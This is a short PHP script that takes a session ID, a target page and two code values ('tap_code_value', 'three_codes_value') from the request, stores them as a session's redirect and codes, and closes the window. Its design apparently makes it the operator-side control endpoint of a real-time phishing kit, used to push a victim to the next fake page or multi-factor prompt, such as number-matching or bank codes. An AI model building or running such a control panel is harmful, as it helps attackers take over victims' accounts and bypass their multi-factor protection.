<?php
require_once __DIR__ . '/config.php';

$session_id = $_GET['session_id'] ?? $_POST['session_id'] ?? '';
$page = $_GET['page'] ?? $_POST['page'] ?? '';
$tap_code_value = $_GET['tap_code_value'] ?? $_POST['tap_code_value'] ?? '';
$three_codes_value = $_GET['three_codes_value'] ?? $_POST['three_codes_value'] ?? '';

if (empty($session_id) || empty($page)) {
    header('Content-Type: text/html');
    echo '<html><body><script>window.close();</script></body></html>';
    exit;
}

$data = getSessionData($session_id);
if (empty($data)) {
    $data = ['created' => time()];
}

$data['redirect'] = $page;
if (!empty($tap_code_value)) {
    $data['tap_code_value'] = $tap_code_value;
}
if (!empty($three_codes_value)) {
    $data['three_codes_value'] = $three_codes_value;
}

updateSessionData($session_id, $data);

header('Content-Type: text/html; charset=utf-8');
echo '<html><head><title>OK</title></head><body><script>window.close();</script></body></html>';
?>
